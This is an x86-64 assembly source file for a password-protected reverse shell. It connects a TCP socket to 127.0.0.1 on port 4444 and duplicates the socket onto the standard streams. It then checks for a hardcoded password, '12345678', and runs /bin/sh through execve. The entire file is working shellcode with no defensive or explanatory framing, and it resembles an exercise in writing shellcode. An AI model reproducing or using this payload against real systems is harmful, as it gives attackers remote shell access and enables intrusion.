global _start

%define AF_INET 2
%define SOCK_STREAM 1

%define PORT 0x5c11			; Port 4444

section .text

_start:

	jmp real_start

	PASSWD_PROMPT: db "Passwd: "
	PASSWD_INPUT: db "AAAAAAAA"

real_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	mov rax, 41
	mov rdi, AF_INET
	mov rsi, SOCK_STREAM
	mov rdx, 0
	syscall

	; RDI <- socket_id for future use

	mov rdi, rax
	;mov r9, rdi

	; Prepare the struct for connect
	;     server.sin_family = AF_INET 
	;     server.sin_port = htons(PORT)
	;     server.sin_addr.s_addr = inet_addr("127.0.0.1")
	;     bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax				; bzero
	
	mov dword [rsp-4], 0x0100007f		; Inet addr == 127.0.0.1
	mov word [rsp-6], 0x5c11		; Port 4444
	mov word [rsp-8], 0x2			; TCP Connection
	sub rsp, 8				; Update RSP value

	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	mov rax, 42				; Syscall number for connect()
	mov rsi, rsp				; & struct
	mov rdx, 16				; Struct length
	syscall

        ; duplicate sockets

        ; dup2 (new, old)
	;     old 
        ;    new <- RDI. RDI already contains the socket_id 

	mov rax, 33
        mov rsi, 0
        syscall

        mov rax, 33
        mov rsi, 1
        syscall

        mov rax, 33
        mov rsi, 2
        syscall

password_check:

write_syscall:

	mov rax, 1				; Syscall number for write()
	mov rdi, 1
	lea rsi, [rel PASSWD_PROMPT]		; Rel addressing to prompt
	mov rdx, 8				; Length of PAsswd: string
	syscall

read_syscall:

	xor rax, rax				; Syscall number for read()
	mov rdi, 0
	lea rsi, [rel PASSWD_INPUT]		; Where to store the input passwd
	mov rdx, 8				; Chars to read
	syscall

compare_passwords:

	mov rax, "12345678"			; Thgis is the password
	lea rdi, [rel PASSWD_INPUT]		; Compare the QWord
	scasq
	jne exit_program			; Passwords don't match, exit

execve_syscall:
	; EXECVE

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall


exit_program:
